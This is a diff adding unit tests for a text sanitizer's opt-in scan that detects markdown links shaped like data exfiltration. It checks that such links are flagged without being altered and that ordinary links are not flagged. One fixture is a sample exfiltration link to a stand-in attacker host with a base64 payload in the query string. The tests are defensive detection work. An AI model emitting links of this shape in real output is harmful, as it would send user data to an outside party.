@@ -177,6 +177,39 @@ describe("sanitize: html=false leaves HTML untouched", () => {
   });
 });
 
+// ─── exfilScan (Layer 3 alone, opt-in) ───────────────────────────────────────
+
+const EXFIL_LINK =
+  "[a](https://evil.example/x?d=SGVsbG8gd29ybGQgbG9uZyBiYXNlNjQgcGF5bG9hZA)";
+
+describe("sanitize: exfilScan detects without splicing", () => {
+  it("flags an exfil-shaped link and leaves the bytes intact", async () => {
+    const input = `text ${EXFIL_LINK} more`;
+    const out = await sanitize(input, { exfilScan: true });
+    assert.equal(out.cleaned, input);
+    assert.deepEqual(out.found, [CATEGORY.EXFIL_URLS]);
+    assert.equal(out.warnings.length, 1);
+    assert.match(out.warnings[0], /URLs shaped like data exfiltration/);
+  });
+
+  it("does not run Layer 3 unless requested (html=false default)", async () => {
+    const input = `text ${EXFIL_LINK} more`;
+    const out = await sanitize(input);
+    assert.deepEqual(out, { cleaned: input, found: [], warnings: [] });
+  });
+
+  it("does not flag an ordinary link (precision: no finding on benign input)", async () => {
+    const input = "see [the docs](https://example.com/guide) for details";
+    const out = await sanitize(input, { exfilScan: true });
+    assert.deepEqual(out, { cleaned: input, found: [], warnings: [] });
+  });
+
+  it("html: true still implies the scan (exfilScan defaults to html)", async () => {
+    const out = await sanitize(`x ${EXFIL_LINK}`, { html: true });
+    assert.ok(out.found.includes(CATEGORY.EXFIL_URLS));
+  });
+});
+
 // ─── options robustness / text type validation (facade contract) ────────────
 
 describe("sanitize: options robustness and text-type validation", () => {
